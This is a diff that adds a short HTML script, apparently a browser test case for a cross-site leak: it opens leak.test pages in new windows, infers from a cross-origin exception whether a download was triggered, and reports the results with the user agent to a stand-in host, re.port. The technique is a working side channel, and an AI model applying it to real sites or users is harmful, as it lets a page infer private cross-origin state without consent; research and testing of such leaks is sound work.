@@ -1,0 +1,37 @@
+<script>
+    var results = [];
+    function run(url, cb) {
+        // Get a window reference
+        var win = window.open(url);
+
+        // Wait for the window to load.
+        setTimeout(function () {
+            try {
+                // If a navigation occurs, the iframe will be cross-origin,
+                // so accessing "win.origin" will throw an exception
+                win.origin;
+                parent.console.log('Download attempt detected');
+                results.push("detected");
+            } catch (e) {
+                parent.console.log('No download attempt detected');
+                results.push("not detected");
+            }
+            cb();
+        }, 2000);
+    }
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case8.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "without_download_bar": results[0],
+            "with_download_bar": results[1],
+            "xsleak_reproduced": results[0] === "not detected" && results[1] === "detected"
+        })));
+        xhr.send();
+    }
+
+    run('https://leak.test/', function () {
+        run('https://leak.test/download/', report);
+    });
+</script>
